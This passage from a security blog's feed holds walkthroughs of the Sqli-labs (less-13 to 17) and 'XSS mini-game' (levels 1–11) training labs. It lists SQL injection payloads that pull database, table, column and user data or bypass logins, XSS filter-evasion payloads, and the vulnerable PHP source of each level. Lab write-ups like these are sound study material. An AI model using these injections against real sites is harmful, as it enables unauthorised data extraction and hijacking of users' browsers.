title="solution1(concat报错)"></a>solution1(concat报错)</h3><p>1.爆库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>2.爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>3.爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><p>4.爆数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) union%20select%20count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,0x3a,floor(rand()*2))a%20from%20information_schema.tables%20group%20by%20a--+</span><br></pre></td></tr></table></figure><h3 id="solution2-逻辑判断"><a href="#solution2-逻辑判断" class="headerlink" title="solution2(逻辑判断)"></a>solution2(逻辑判断)</h3><p>思路：首先我们post一个错误的uname和passwd过去，然后构造or语句后面跟上查询语句，这样的话第一句话为flase，如果第二个查询也为flase，则会回显错误图片slap.jpg，否则回显正确图片flag.jpg</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr(database(),1,1))=115--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos;) or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101--+</span><br></pre></td></tr></table></figure><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>除了闭合方式为双引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>闭合方式为单引号，其他和less-13一样，不再赘述；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&apos; or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>闭合方式为双引号加括号：<code>&quot;)</code>，其余和less-13一致；</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&amp;passwd=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="小结3"><a href="#小结3" class="headerlink" title="小结3"></a>小结3</h2><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p>这是在用uname查询之前经过的check_input()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function check_input($value)</span><br><span class="line">&#123;</span><br><span class="line">if(!empty($value))</span><br><span class="line">&#123;</span><br><span class="line">// truncation (see comments)</span><br><span class="line">$value = substr($value,0,15);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Stripslashes if magic quotes enabled</span><br><span class="line">if (get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$value = stripslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Quote if not a number</span><br><span class="line">if (!ctype_digit($value))</span><br><span class="line">&#123;</span><br><span class="line">$value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$value = intval($value);</span><br><span class="line">&#125;</span><br><span class="line">return $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>1</strong>. 若<code>uname</code>非空，截取它的前15个字符。<br><strong>2</strong>. 若php环境变量<code>magic_quotes_gpc</code>打开，去除转义的反斜杠<code>\</code>。<br><strong>3</strong>. 若<code>uname</code>字符串非数字，将其中特殊字符转义；为数字则将其转为数字类型。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Sqli-labs初体验~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="Sql注入" scheme="https://gardenia30.top/tags/Sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XSS小游戏通关笔记</title>
    <link href="https://gardenia30.top/2019/04/03/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/04/03/XSS小游戏通关笔记/</id>
    <published>2019-04-03T03:21:16.000Z</published>
    <updated>2019-04-09T09:29:15.400Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>XSS-初体验~<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h2><p>第一关非常基础，黑盒下传参name构造<code>?name=&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗，属于反射性XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码发现没有过滤…</p><h2 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h2><p>第二关也没有什么难度，黑盒下在输入框中测试test，查看页面的html发现<code>&lt;input name=keyword  value=&quot;test&quot;&gt;</code>直接闭合双引号和input标签，构造<code>?keyword=&quot;&gt;&lt;script&gt;alert(&#39;hacker&#39;);&lt;/script&gt;</code>即可弹窗；同样是属于反射型XSS；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br></pre></td></tr></table></figure><p>查看源码，果然…</p><h2 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h2><p>界面和第二关差不多，黑盒下测试输入test2333，查看页面html发现<code>&lt;input name=keyword  value=&#39;test2333&#39;&gt;</code>，发现是单引号闭合，尝试闭合引号和标签：</p><p><code>?keyword=&#39;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code>，却发现：</p><p><code>&lt;input name=keyword  value=&#39;&#39;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;xss&#39;);&amp;lt;/script&amp;gt;&#39;&gt;</code></p><p>看样子是设置了特殊字符转码，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>果然是添加了<code>htmlspecialchars()</code>函数进行了过滤，所以这里不能再用闭合标签的方法来构造弹窗了，采取闭合value引号，<strong>添加html事件属性</strong>的方法来构造弹窗：</p><p>payload：<code>&#39; onkeypress=&#39;alert(&quot;hacker&quot;)</code>，在输入框中敲击键盘即可弹窗；</p><h2 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h2><p>和level-3几乎一样，测试发现输出点，<code>&lt;input name=keyword  value=&quot;test2333&quot;&gt;</code></p><p>发现这次是双引号，直接闭合，构造html事件属性造成弹窗即可；</p><p>payload：<code>?keyword=&quot; onmouseover=&quot;alert(&#39;xss&#39;)</code></p><p>level-3和4这里需要注意的是闭合的到底是双引号还是单引号，里面的alert引号也需要随之变化，不能使用同样的引号，否则会达不到效果；</p><h2 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h2><p>上来还是像上面一样尝试闭合引号，添加一个html事件属性，但是这次已经不起作用，查看html发现：</p><p><a href="https://imgchr.com/i/Ar6FM9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/Ar6FM9.png" alt="Ar6FM9.png"></a></p><p>事件属性貌似也被过滤了……这好像就触及到我的知识盲点了，google一波发现可以使用html链接，所以直接闭合引号和标签，再写入一个html链接，链接效果为弹窗即可：</p><p>payload：<code>&quot;&gt; &lt;a href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现果然是不能使用<code>&lt;script&gt;</code>标签和事件属性，全部都被替换掉了……</p><h2 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h2><p>直接查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>链接属性也别过滤掉了…心碎…</p><p>但是仔细对比一下就可以发现，这一关没有进行小写转换，<code>$str = strtolower($_GET[&quot;keyword&quot;]);</code>这是极其重要的，因为html对大小写是不敏感的，即使是大写也可以正常运行，所以直接可以用大写绕过…</p><p>payload:<code>&quot;&gt; &lt;a Href=&quot;javascript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt;</code></p><h2 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>相信打过ctf的人都知道<code>str_replace()</code>这个函数在代码审计里的漏洞，替换为空时可以直接双写绕过</p><p>payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascscriptript:alert(&#39;hacker&#39;)&quot;&gt;click me&lt;/a&gt; //</code></p><h2 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h2><p>这一关貌似和前面的都不太一样，回显有两个输出的地方，发现第二个输出是：把你输入的内容当做一个链接内容放在href属性里面，所以这一关应该就是构造一个可以绕过script字符串替换的字符，</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现这里双引号都被过滤掉了，那肯定是不可以闭合标签了，问题就是链接里的<code>javascript:alert(&#39;hacker&#39;)</code></p><p>script会被替换，要想办法绕过即可，既然是链接，直接unicode编码即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)</code></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h2><p>这一关有点奇怪，直接查看源码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str7).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现相比上一关，多了一个if判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(false===strpos($str7,&apos;http://&apos;))</span><br></pre></td></tr></table></figure><p>也就是说我们构造的字符串里必须要含有<code>http://</code>这样的字符，结合上一关，需要在字符中添加<code>http://</code>的字符，并且还不能让其起作用…直接注释掉即可：</p><p>payload:<code>java&amp;#115;cript:alert(1)//http://</code></p><h2 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现GET了两个值，分别是<code>keyword</code>和<code>t_sort</code>；</p><p><code>keyword</code>不多说，GG……输出点只有一个，而且被过滤了…</p><p>另一个切入点就是t_sort参数，查看代码发现是滤掉了<code>&lt;和&gt;</code>，那标签一类的就不可以使用了，输出点属性hidden，所以看不见；</p><p>这里我们使用另一种绕过方法，先闭合value的引号，然后添加html事件属性，随后设置type为text(对同一属性赋不同的值时，浏览器解析时只会解析第一次出现的属性)；</p><p>payload:<code>?keyword=test&amp;t_sort=&quot; onkeypress=&quot;alert(&#39;hacker&#39;)&quot; type=&quot;text&quot;&gt;</code></p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h2><p>查看源代码发现又多了一个参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> 